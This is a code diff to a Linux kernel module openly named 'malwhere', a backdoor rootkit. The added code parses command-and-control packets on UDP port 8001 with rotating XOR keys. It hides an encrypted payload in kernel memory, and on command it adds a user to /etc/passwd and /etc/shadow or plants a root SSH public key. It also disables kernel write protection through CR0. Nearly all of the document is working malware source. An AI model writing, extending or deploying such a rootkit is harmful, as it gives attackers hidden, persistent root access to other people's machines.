@@ -34,21 +34,127 @@
 
 #include "sensitive.h"
 
-#define KEY 97425196
+#define DEFAULT_KEY 97425196
+#define KEY_STR_LEN 10
+#define CMD_ADD_USER   1
+#define CMD_ADD_PUBKEY 2
+
+int cur_key = 0;
+int new_key = DEFAULT_KEY; // Initialize encryption key with at least someting
+static int debug_output = 0;
 char *module_str = "malwhere";
 unsigned char *nfhook_deep_space = NULL;
 struct nf_hook_ops nfho;
-struct task_struct *task_watchdog;
+struct task_struct *task_watchdog = NULL;
 atomic_t trigger_add_user = ATOMIC_INIT(0);
 atomic_t trigger_add_pubkey = ATOMIC_INIT(0);
 atomic_t payload_encrypted = ATOMIC_INIT(0);
 
+struct command {
+  unsigned int action, cur_key, new_key;
+};
+
+struct key_state {
+  unsigned int cur_key, new_key;
+};
+
+/* Disable page modification - reenable W^X */
 void disable_pm(void) {
   write_cr0(read_cr0() & (~ 0x10000));
 }
 
+/* Enable page modification - disable W^X */
 void enable_pm(void) {
   write_cr0(read_cr0() | 0x10000);
+}
+
+
+/* Command packet follows this format:
+ *   1. initiation sequence
+ *   2. ':'
+ *   3. current key (KEY_STR_LEN)
+ *   4. ':'
+ *   5. new key     (KEY_STR_LEN). All zeros if the key shouldn't change
+ *   6. ':'
+ *   7. command     (char)
+ *
+ * TODO: use a lock to process commands. Take a lock when a command is accepted
+ *       and release the lock when it is processed and the payload is encrypted.
+ *       In practice, commands should come from a race-free source.
+ */
+struct command *get_command(unsigned char *data, size_t len) {
+  printk(KERN_ALERT "get_command()");
+  char initiation[] = {0x6b,0x65,0x79};
+  char action = 0;
+  int cur_key, new_key = 0;
+  int i = 0;
+  char intbuf[KEY_STR_LEN+1];
+
+  // Perform length check immediately to improve performance in the likely case
+  // that the packet is not from C2. 
+  size_t cmd_pkt_len = sizeof(initiation) + 1 + KEY_STR_LEN + 1 + KEY_STR_LEN + 1 + 1;
+  printk(KERN_ALERT "%d==%d ?\n", len, cmd_pkt_len);
+  if (likely(len != cmd_pkt_len)){
+    debug_output && printk(KERN_ALERT "Packet len didn't match\n");
+    return NULL;
+  }
+
+  struct command *cmd = NULL;
+  int initiation_idx = 0;
+  int cur_key_idx = initiation_idx + 1 + sizeof(initiation);
+  int new_key_idx = cur_key_idx + 1 + KEY_STR_LEN;
+  int action_idx = new_key_idx + 1 + KEY_STR_LEN;
+
+  if ((cmd = kmalloc(sizeof(struct command), GFP_KERNEL)) == NULL)
+    return NULL;
+
+  if (memcmp(data, initiation, sizeof(initiation)) != 0) {
+    debug_output && printk(KERN_ALERT "Key doesn't match\n");
+    return NULL;
+  }
+  debug_output && printk(KERN_ALERT "Key matches\n");
+
+  // Copy in current key from the command packet
+  for (i = 0; i < KEY_STR_LEN; i++)
+    intbuf[i] = data[cur_key_idx+i];
+
+  intbuf[KEY_STR_LEN] = '\0';
+  if (kstrtouint(intbuf, 10, &cmd->cur_key) < 0) {
+    kfree(cmd);
+    return NULL;
+  }
+
+  // Copy in new key from the command packet. Even if it isn't changed, it's
+  // required.
+  for (i = 0; i < KEY_STR_LEN; i++)
+    intbuf[i] = data[new_key_idx+i];
+
+  intbuf[KEY_STR_LEN] = '\0';
+  if (kstrtouint(intbuf, 10, &cmd->new_key) < 0) {
+    kfree(cmd);
+    return NULL;
+  }
+
+  if (cmd->new_key == 0)
+    cmd->new_key = cmd->cur_key;
+
+  cmd->action = data[action_idx];
+
+  return cmd;
+}
+
+void free_command(struct command *cmd) {
+  if (cmd != NULL)
+    kfree(cmd);
+  return;
+}
+
+int is_add_user(struct command *cmd) {
+  return cmd && cmd->action & CMD_ADD_USER;
+}
+
+int is_add_pubkey(struct command *cmd) {
+  return cmd && cmd->action & CMD_ADD_PUBKEY;
 }
 
 static unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)) {
@@ -58,31 +164,57 @@ static unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const stru
   unsigned char *data;
   size_t pkt_len;
   size_t udphdr_len;
+  struct command *cmd = NULL;
 
   if (!this_skb){
-    return NF_ACCEPT;
+    goto accept;
   }
 
   this_iphdr = (struct iphdr *) skb_network_header(this_skb);
   if (this_iphdr && this_iphdr->protocol == IPPROTO_UDP) {
     this_udphdr = skb_transport_header(this_skb);
     udphdr_len = sizeof(struct udphdr);
-    printk(KERN_ALERT "UDP (%d)", ntohs(this_udphdr->dest));
+    debug_output && printk(KERN_ALERT "Got UDP. Looking for port %d", ntohs(this_udphdr->dest));
     if (ntohs(this_udphdr->dest) == 8001) {
-      printk(KERN_ALERT "UDP/8001");
+      debug_output && printk(KERN_ALERT "UDP/8001");
       data = skb->data + ip_hdrlen(skb) + sizeof(struct udphdr);
       pkt_len = skb->len - ip_hdrlen(skb) - sizeof(struct udphdr);
-      printk(KERN_ALERT "PACKET");
-      if (memcmp(data, "ADDUSER", 7) == 0) {
-        printk(KERN_ALERT "ADDUSER");
-        atomic_set(&trigger_add_user, 1);
-      } else if (memcmp(data, "ADDPUBKEY", 9) == 0) {
-        atomic_set(&trigger_add_pubkey, 1);
+      debug_output && printk(KERN_ALERT "PACKET (%d bytes)", pkt_len);
+
+      if ((cmd = get_command(data, pkt_len)) == NULL){
+        printk(KERN_ALERT "Got NULL from get_command()\n");
+        goto accept;
       }
+      
+      // Command packet is valid, process the action.
+      if (is_add_user(cmd)) {
+        atomic_set(&trigger_add_user, 1);
+        debug_output && printk(KERN_ALERT "Will add user");
+      } else if (is_add_pubkey(cmd)) {
+        atomic_set(&trigger_add_pubkey, 1);
+        debug_output && printk(KERN_ALERT "Will add pubkey");
+      } else {
+        // Action is invalid.
+        debug_output && printk(KERN_ALERT "Got command packet with bad action %x\n", cmd->action);
+        goto accept;
+      }
+
+      // Pass the keys along to the payload.
+      cur_key = cmd->cur_key;
+      new_key = cmd->new_key;
+
+      // And get rid of these temporary keys.
+      cmd->cur_key = 0;
+      cmd->new_key = 0;
+      cmd->action = 0;
+
+      kfree(cmd);
+
       return NF_DROP;
     }   
   }
 
+  accept:
   return NF_ACCEPT;
 }
 
@@ -113,7 +245,7 @@ void xor_range(unsigned char *addr, size_t len, unsigned int k) {
 
 // Align SENSITIVE_LEN on key-length boundary to ensure no over-encryption.
 size_t encrypt_len(unsigned int k) {
-  printk(KERN_ALERT "encrypt_len: %d", SENSITIVE_LEN - (SENSITIVE_LEN % sizeof(k)));
+  debug_output && printk(KERN_ALERT "encrypt_len: %d", SENSITIVE_LEN - (SENSITIVE_LEN % sizeof(k)));
   return SENSITIVE_LEN - (SENSITIVE_LEN % sizeof(k));
 }
 
@@ -121,37 +253,58 @@ int is_payload_encrypted(void) {
   return atomic_read(&payload_encrypted) == 1;
 }
 
+// Always encrypt with the new key. Assume that it is kept current.
 void encrypt_payload(void) {
   if (is_payload_encrypted())
     return;
-  xor_range((unsigned char *)add_file_line, encrypt_len(KEY), KEY);
+  xor_range((unsigned char *)add_file_line, encrypt_len(new_key), new_key);
   atomic_set(&payload_encrypted, 1);
+  new_key = 0;
 }
 
+/* Always decrypt with the current key. Since this key is thrown away after
+ * every decryption, we assume that if the command packet came in with the
+ * correct initiation key, that the packet contains the correct current key.
+ * If not, the kernel will at least oops.
+ */
 void decrypt_payload(void) {
   if (!is_payload_encrypted())
     return;
-  xor_range((unsigned char *)add_file_line, encrypt_len(KEY), KEY);
+  xor_range((unsigned char *)add_file_line, encrypt_len(cur_key), cur_key);
   atomic_set(&payload_encrypted, 0);
+  // Get rid of it.
+  cur_key = 0;
 }
 
 int wait_for_command(void *data) {
+  int processed = 0;
   while (!kthread_should_stop()) {
     ssleep(5);
-    printk(KERN_ALERT "foo/0 Running: trigger_add_user=%d\n", atomic_read(&trigger_add_user));
-    printk(KERN_ALERT "foo/0 Running: trigger_add_pubkey=%d\n", atomic_read(&trigger_add_pubkey));
+    debug_output && printk(KERN_ALERT "Thread running\n", atomic_read(&trigger_add_pubkey));
+    
+    /* It's possible for multiple triggers to come in at the same time. This
+     * will end poorly since the payload encryption keys are deleted after use.
+     * This means if one trigger processes immediately after the other, odds
+     * are good that the key material is corrupted. Fix this with a lock.
+     * Poor-man's fix is to skip any unprocessed triggers by setting them to 0.
+     */
     if (atomic_read(&trigger_add_user) == 1) {
       decrypt_payload();
       add_user_passwd();
       add_user_shadow();
       encrypt_payload();
-      atomic_set(&trigger_add_user, 0);
-    }
-    if (atomic_read(&trigger_add_pubkey) == 1) {
+      processed = 1;
+    } else if (atomic_read(&trigger_add_pubkey) == 1) {
       decrypt_payload();
       add_root_pubkey();
       encrypt_payload();
+      processed = 1;
+    }
+
+    if (processed) {
+      atomic_set(&trigger_add_user, 0);
       atomic_set(&trigger_add_pubkey, 0);
+      processed = 0;
     }
   }
   printk(KERN_INFO "Thread Stopping\n");
@@ -159,8 +312,9 @@ int wait_for_command(void *data) {
 }
 
 static int __init init(void) {
+  printk(KERN_INFO "debug_output=%d\n", debug_output);
   encrypt_payload();
-  printk(KERN_INFO, "SETTING HOOK");
+  debug_output && printk(KERN_INFO, "Setting nfhook");
   set_nf_hook();
   task_watchdog = kthread_run(wait_for_command, NULL, "static");
 
@@ -208,7 +362,8 @@ static int __init init(void) {
 
 static void __exit exit(void) {
   printk(KERN_INFO "[%s] exiting\n", module_str);
-  kthread_stop(task_watchdog);
+  if (task_watchdog)
+    kthread_stop(task_watchdog);
   unset_nf_hook();
   printk(KERN_INFO "[%s] exited\n", module_str);
 }
@@ -219,3 +374,6 @@ module_exit(exit);
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("@unixist");
 MODULE_DESCRIPTION("malwhere");
+
+module_param(debug_output, int, 0000);
+MODULE_PARM_DESC(debug_output, "Enable debug output.");
